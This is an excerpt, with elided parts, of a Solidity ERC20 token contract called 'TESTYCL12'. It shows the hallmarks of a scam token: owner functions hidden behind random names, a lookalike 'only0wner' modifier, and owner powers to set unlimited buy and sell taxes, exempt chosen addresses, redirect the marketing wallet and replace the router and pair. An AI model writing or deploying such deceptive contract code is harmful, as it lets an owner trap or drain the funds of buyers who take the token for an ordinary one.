...
contract TESTYCL12 is ERC20, Ownable{
    ...
    address public marketingWallet = 0xE54a58DDfC906e07E9882Bbe938B23fc94bEdecB;
    ...
    mapping (address => bool) public DBcLJEXBya;
    ...
    constructor() ERC20("TESTYCL12", "TESTYCL12") {
        ...
        DBcLJEXBya[msg.sender] = true;
        DBcLJEXBya[address(pair)] = true;
        DBcLJEXBya[marketingWallet] = true;
        DBcLJEXBya[address(router)] = true;
        DBcLJEXBya[address(this)] = true;
    }
    ...
    function jHBKhNCEcgnxrUN(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function uwVoUzXvMdZ(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            DBcLJEXBya[accounts[i]] = newValue;
        }
    }

    function wfNNVomTNCfejX(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function ItNSBJhyQZt(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function VFfXAVhhaUAinl(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function ASiZylhwCcIEGj(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
